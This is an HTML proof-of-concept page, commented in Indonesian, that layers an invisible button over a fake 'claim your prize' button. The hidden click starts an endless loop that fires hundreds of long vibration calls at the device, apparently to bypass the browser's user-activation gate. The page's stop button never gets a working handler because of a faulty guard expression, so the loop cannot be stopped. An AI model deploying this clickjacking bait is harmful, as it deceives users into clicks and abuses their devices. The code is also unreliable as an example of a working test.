<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Test: Clickjacking & Async Race Condition</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #121214;
            color: #e3e3e3;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            margin: 30px auto;
            background: #1e1e24;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        button {
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 10px;
            border: none;
            transition: 0.2s;
        }
        .btn-stop { background-color: #dc3545; color: white; }
        .btn-stop:hover { background-color: #bd2130; }
        
        #status-log {
            margin-top: 20px;
            padding: 15px;
            background: #000;
            color: #00ff66;
            font-family: monospace;
            text-align: left;
            border-radius: 6px;
            font-size: 12px;
            min-height: 150px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
        }

        /* ======================================================== */
        /* PENYEMPURNAAN STRATEGI CLICKJACKING                      */
        /* ======================================================== */
        .bait-box {
            position: relative; /* Menjadi jangkar posisi absolut untuk tombol transparan */
            margin: 20px 0;
            padding: 0;         /* Diubah ke 0 agar overlay tombol menutupi 100% area tanpa celah */
            border: 2px dashed #333;
            border-radius: 30px; /* Menyelaraskan kebulatan sudut wadah dengan tombol */
            background: #1a1a1e;
            overflow: hidden;   /* Memastikan elemen transparan tidak bocor keluar batas */
        }
        
        /* Umpan visual yang dilihat oleh target */
        .fake-target-btn {
            background: #007bff;
            color: white;
            padding: 15px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 30px;
            display: inline-block;
            width: 100%;
            box-shadow: 0 4px 15px rgba(0,123,255,0.3);
        }

        /* Tombol start asli yang dimanipulasi agar menutup sempurna tepat di atas umpan */
        #startBtn {
            position: absolute;
            top: 0;       /* Menempel mutlak di ujung atas wadah */
            left: 0;      /* Menempel mutlak di ujung kiri wadah */
            width: 100%;  /* Menutupi 100% lebar wadah umpan */
            height: 100%; /* Menutupi 100% tinggi wadah umpan */
            background: transparent;
            opacity: 0;   /* Sepenuhnya transparan (tak terlihat oleh mata) */
            z-index: 99;  /* Berada di lapisan teratas agar memotong interaksi sentuhan */
            cursor: pointer;
            border: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Clickjacking Race Experiment</h2>
    <p style="color: #aaa; font-size: 14px; margin-top: 5px;">Ketuk tombol biru untuk mensimulasikan jacking gesture dan memulai kondisi balapan.</p>
    
    <!-- Area Clickjacking Terisolasi -->
    <div class="bait-box">
        <div class="fake-target-btn">KLAIM HADIAH ANDA</div>
        <!-- Tombol Start Asli Menimpa Tombol Palsu secara Presisi -->
        <button id="startBtn"></button>
    </div>

    <button id="stopBtn" class="btn-stop">HENTIKAN PENGUJIAN</button>

    <h3>Konsol Log Logika:</h3>
    <div id="status-log">Menunggu inisialisasi klik...</div>
</div>

<script>
    const logBox = document.getElementById('status-log');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');

    let isRunning = false;
    let loopCounter = 0;

    function writeLog(text) {
        logBox.innerHTML += "\n> " + text;
        logBox.scrollTop = logBox.scrollHeight;
        console.log(text);
    }

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    // Logika Race Condition (900 iterasi asinkron)
    async function triggerRaceCondition() {
        let promises = [];
        for (let i = 0; i < 900; i++) {
            promises.push((async () => {
                await sleep(Math.random() * 100); 
                if (navigator.vibrate) {
                    return navigator.vibrate(999999999999999999);
                }
                return false;
            })());
        }
        const results = await Promise.all(promises);
        return results.includes(true);
    }

    // Fungsi Pengulangan Utama
    async function startTestingLoop() {
        isRunning = true;
        loopCounter = 0;
        logBox.innerHTML = "";
        writeLog("💥 Clickjacking Sukses: Gesture token berhasil direbut!");
        writeLog("Memulai Loop Penundaan & Paket Race...");

        while (isRunning) {
            loopCounter++;
            writeLog(`[Siklus #${loopCounter}] Memulai delay asinkron 6 detik...`);
            
            await sleep(6000);

            // Jika eksekusi stop ditekan saat delay, langsung potong alur keluar dari loop
            if (!isRunning) break;

            if (navigator.userActivation) {
                writeLog(`Siklus #${loopCounter} - Status Aktivasi Resmi (isActive): ` + navigator.userActivation.isActive);
            }

            writeLog(`Siklus #${loopCounter} - Meluncurkan 900 Paket Race...`);
            let isBypassed = await triggerRaceCondition();

            if (isBypassed) {
                writeLog(`🚨 BUG CONFIRMED: Getar lolos otomatis di Siklus #${loopCounter}!`);
            } else {
                writeLog(`❌ Siklus #${loopCounter}: Diblokir sistem inti browser.`);
            }

            await sleep(1000);
        }
    }

    // Pemicu Klik Tersembunyi
    startBtn.addEventListener('click', () => {
        if (!isRunning) {
            startBtn.style.pointerEvents = 'none'; // Matikan klik tambahan agar tidak menumpuk instansi loop
            startTestingLoop();
        }
    });

    // Pemicu Stop Bersih
    stopBtn.getElementById && stopBtn.addEventListener('click', () => {
        isRunning = false;
        if (navigator.vibrate) {
            navigator.vibrate(0); // Batalkan semua perintah haptik aktif di antrean perangkat keras
        }
        writeLog("🛑 Pengujian dihentikan. Memori dibersihkan.");
        startBtn.style.pointerEvents = 'auto'; // Mengembalikan kemampuan klik untuk pengujian ulang
    });
</script>

</body>
</html>
